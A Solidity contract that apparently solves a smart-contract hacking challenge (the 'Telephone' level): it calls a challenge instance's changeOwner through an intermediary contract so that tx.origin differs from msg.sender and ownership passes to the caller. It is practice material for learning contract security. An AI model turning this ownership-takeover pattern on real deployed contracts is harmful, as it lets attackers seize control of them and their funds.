// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {

    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        Telephone(challengeInstance).changeOwner(msg.sender);
    }
}